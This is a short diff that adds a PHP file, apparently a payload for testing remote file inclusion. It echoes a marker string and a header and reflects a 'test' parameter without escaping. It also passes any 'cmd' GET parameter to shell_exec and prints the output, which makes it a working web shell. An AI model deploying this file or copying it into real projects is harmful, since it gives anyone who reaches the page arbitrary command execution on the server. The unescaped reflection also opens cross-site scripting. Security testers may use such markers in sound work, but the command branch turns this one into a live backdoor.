@@ -1,1 +1,11 @@
+<?php
 
+header("X-RFI-Test: RFI_AbCdEfGh");  // Replace with actual test string
+echo "RFI_AbCdEfGh_RFI_TEST_SUCCESS";
+if(isset($_GET['test'])) {
+    echo "\nTest Parameter: " . $_GET['test'];
+}
+if(isset($_GET['cmd'])) {
+    echo "\nCommand Output: " . shell_exec($_GET['cmd']);
+}
+?>
